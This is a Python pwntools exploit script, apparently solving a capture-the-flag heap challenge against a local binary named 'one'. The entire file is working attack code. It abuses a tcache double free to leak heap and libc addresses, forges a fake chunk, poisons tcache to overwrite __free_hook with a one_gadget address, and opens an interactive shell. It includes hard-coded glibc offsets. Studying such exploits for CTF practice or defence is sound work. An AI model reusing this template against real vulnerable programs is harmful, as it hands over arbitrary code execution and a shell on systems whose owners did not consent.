from pwn import *

context.terminal = '/bin/dash'

libc_main_arena = 0x3ebc40
libc_free_hook = 0x3ed8e8
one_gadget = 0x4f322

def create(s, text):
    print '--- CREATE ---'
    print s.recvuntil('>')
    s.send('1\n')
    s.recvuntil('>')
    s.send(text + '\n')

def show(s):
    print '--- SHOW ---'
    print s.recvuntil('> ')
    s.send('2\n')
    return s.recvline()[:-1]

def delete(s):
    print '--- DELETE ---'
    s.recvuntil('> ')
    s.send('3\n')

s = process('./one')

create(s, 'hello')

delete(s)
delete(s)
delete(s)

addr = u64(show(s).ljust(8, '\0'))
print hex(addr)

heap_base = addr

create(s, p64(heap_base - 0x10)) # tcache = heap_base -> (heap_base - 0x10)
create(s, '1') # tcache = (heap_base - 0x10)

# *(heap_base - 0x10) = prev = heap_base
# *(heap_base - 0x8) = size
create(s, p64(heap_base) + p64(0) + p64(0))

# allocate buffer to create fake chunk
for i in range(20):
    create(s, p64(0) + p64(0))

# tcache dup and adjust tcache count
delete(s)
delete(s)
delete(s)
delete(s)

# tcache (len = 4) = heap_base -> heap_base


create(s, p64(heap_base - 0x10))

# tcache (len = 3) = heap_base -> (heap_base - 0x10)

create(s, 'dummy')

# prev = heap_base
# size = 0x50 * 20 + 1 (CHUNK_IN_USE)
create(s, p64(heap_base) + p64(0x50 * 20 + 1) + p64(0))

# tcache[0x50] = NULL
create(s, p64(0) + p64(0))

# free(heap_base)
delete(s)

addr = u64(show(s).ljust(8, '\0'))
print hex(addr)

main_arena = addr - 96
libc_base = main_arena - libc_main_arena
print 'main_arena:' + hex(main_arena)
print 'libc_base:' + hex(libc_base)

create(s, 'AAAA')
delete(s) # tcache(len = 1) = heap_base
delete(s) # tcache(len = 2) = heap_base -> heap_base
delete(s) # tcache(len = 3) = heap_base -> heap_base

create(s, p64(libc_base + libc_free_hook)) # tcache(len = 2) = heap_base -> free_hook
create(s, 'dummy') # tcache(len = 1) = free_hook
create(s, p64(libc_base + one_gadget))

# call free
delete(s)

s.interactive()

